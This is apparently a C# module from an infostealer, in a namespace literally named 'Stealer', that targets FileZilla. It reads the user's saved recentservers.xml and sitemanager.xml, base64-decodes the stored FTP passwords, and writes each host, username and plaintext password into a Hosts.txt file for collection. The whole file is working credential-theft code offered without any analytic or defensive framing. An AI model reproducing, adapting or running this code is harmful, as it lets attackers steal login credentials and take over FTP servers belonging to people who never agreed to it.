using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;

namespace Stealer;

internal sealed class FileZilla
{
	private static string[] GetPswPath()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\";
		return new string[2]
		{
			text + "recentservers.xml",
			text + "sitemanager.xml"
		};
	}

	public static List<Password> Steal()
	{
		List<Password> list = new List<Password>();
		string[] pswPath = GetPswPath();
		if (!File.Exists(pswPath[0]) && !File.Exists(pswPath[1]))
		{
			return list;
		}
		string[] array = pswPath;
		foreach (string text in array)
		{
			try
			{
				if (!File.Exists(text))
				{
					continue;
				}
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(text);
				foreach (XmlNode item2 in xmlDocument.GetElementsByTagName("Server"))
				{
					Password item = default(Password);
					item.sUrl = "ftp://" + item2["Host"]!.InnerText + ":" + item2["Port"]!.InnerText + "/";
					item.sUsername = item2["User"]!.InnerText;
					item.sPassword = Encoding.UTF8.GetString(Convert.FromBase64String(item2["Pass"]!.InnerText));
					Counter.FTPHosts++;
					list.Add(item);
				}
			}
			catch
			{
			}
		}
		return list;
	}

	private static string FormatPassword(Password pPassword)
	{
		return $"Url: {pPassword.sUrl}\nUsername: {pPassword.sUsername}\nPassword: {pPassword.sPassword}\n\n";
	}

	public static void WritePasswords(List<Password> pPasswords, string sSavePath)
	{
		if (pPasswords.Count == 0)
		{
			return;
		}
		Directory.CreateDirectory(sSavePath);
		foreach (Password pPassword in pPasswords)
		{
			File.AppendAllText(sSavePath + "\\Hosts.txt", FormatPassword(pPassword));
		}
	}
}
